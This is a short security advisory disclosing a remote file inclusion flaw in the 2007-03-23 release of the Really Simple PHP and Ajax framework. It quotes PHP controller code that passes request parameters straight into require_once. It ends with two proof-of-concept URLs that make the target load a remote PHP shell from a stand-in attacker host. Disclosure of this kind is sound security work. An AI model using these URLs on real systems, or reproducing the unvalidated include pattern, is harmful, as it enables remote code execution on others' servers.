Really Simple PHP and Ajax (RSPA) 2007-03-23 RFI Vulnerability
==============================================================



RSPA Remote File Inclusion

Really Simple PHP and Ajax (RSPA)
RSPA is a component based event driven ajax enabled framework for PHP4 and PHP 5. It is a combination of plane PHP class and HTML/Javascript.RSPA allows calling server side PHP functions from client javascript events. Visit http://rspa.sourceforge.net


Vulnerable Systems:
Version: rspa-2007-03-23

Description:
Input passed to the" __IncludeFilePHPClass ", " __ClassPath" and " __class" parameters in "rspa/framework/Controller_v5.php" and " rspa/framework/Controller_v4.php " is not properly verified before being used to include files. This can be exploited to execute arbitrary PHP code by including files from local or external resources.



Vulnerable Code :
require_once("rspaconf.inc.php");

	$className = $_REQUEST[&#039;__class&#039;];
	$methordName =  $_REQUEST[&#039;__methord&#039;];

	// IncludeFile for PHP Class
		if ($_REQUEST[&#039;__IncludeFilePHPClass&#039;]){
			$filename = $_REQUEST[&#039;__IncludeFilePHPClass&#039;];
			require_once ($filename);
		}

	// Parms
		if (isset($_REQUEST[&#039;__parameters&#039;])){$parameter = getParms($_REQUEST[&#039;__parameters&#039;]);}else{$parameter="";}

	// ClassFile + ClassPath
		include ("../components/Form.class.php");
	 	if ($_REQUEST["__ClassPath"]=="null" || empty($_REQUEST["__ClassPath"])){
	 		$filename = $RSPA[&#039;class_folder&#039;].$className.$RSPA[&#039;class_extension&#039;];
	 	}else{
	 		$filename = $_REQUEST["__ClassPath"].$className.$RSPA[&#039;class_extension&#039;];
	 	}
	 	require_once($filename);



POC exploit :
The following URL will cause remote file inclusion

http://[HOST]/rspa/framework/Controller_v5.php?__IncludeFilePHPClass=http://attacker/phpshell.txt/?
http://[HOST]/rspa/framework/Controller_v4.php?__ClassPath=http://attacker/phpshell.txt/?



